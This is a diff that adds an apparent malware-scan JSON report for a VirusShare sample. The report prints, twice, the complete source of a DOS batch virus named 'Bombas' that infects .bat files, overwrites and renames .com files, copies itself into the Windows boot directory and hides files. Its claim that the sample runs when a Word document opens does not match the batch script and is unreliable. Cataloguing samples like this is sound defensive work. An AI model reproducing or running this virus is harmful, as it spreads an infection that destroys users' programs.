@@ -1,0 +1,57 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened"
+        },
+        "macro": ":Bombas on your computer 2000\n@echo off\nif \"%0\"==\"AUTOEXEC.BAT\" goto  aut\ngoto rep\n:aut\n@echo off\necho Bombas ver 1.05 on your computer! Be well...\nexit\n:rep\nfor %%w in (*.bat) do set bas=%%w\nfind \"bas\" %%w\nif errorlevel 1 type %0>>%bas%\nset boom= *.com\nctty nul\ncopy %0 %winbootdir%\\%0\ncopy %0 ..\nif not exist %boom% goto fun\nfor %%i in (%boom% ..\\%boom%) do copy %%i *.vdv\nfor %%k in (%boom% ..\\%boom%) do copy %0 %%k\nren *.com *.bat\nattrib *.vdv + h\nattrib %0 -h\ngoto rep\n:fun"
+    },
+    "filename": "VirusShare_1dcd8b286f9a3ec2913e80378a513077",
+    "filesize": 504,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1dcd8b286f9a3ec2913e80378a513077",
+        "sha1": "3a2dbc2380208d6d9c5db092a6322a4bd9e40d82",
+        "sha256": "ee995d3d5fb2b77f12cfee53300419ac8e949b9df8e53c749dbf634c6ed8aa13"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            ":Bombas on your computer 2000",
+            "@echo off",
+            "if \"%0\"==\"AUTOEXEC.BAT\" goto  aut",
+            "goto rep",
+            ":aut",
+            "@echo off",
+            "echo Bombas ver 1.05 on your computer! Be well...",
+            "exit",
+            ":rep",
+            "for %%w in (*.bat) do set bas=%%w",
+            "find \"bas\" %%w",
+            "if errorlevel 1 type %0>>%bas%",
+            "set boom= *.com",
+            "ctty nul",
+            "copy %0 %winbootdir%\\%0",
+            "copy %0 ..",
+            "if not exist %boom% goto fun",
+            "for %%i in (%boom% ..\\%boom%) do copy %%i *.vdv",
+            "for %%k in (%boom% ..\\%boom%) do copy %0 %%k",
+            "ren *.com *.bat",
+            "attrib *.vdv + h",
+            "attrib %0 -h",
+            "goto rep",
+            ":fun"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.284242",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
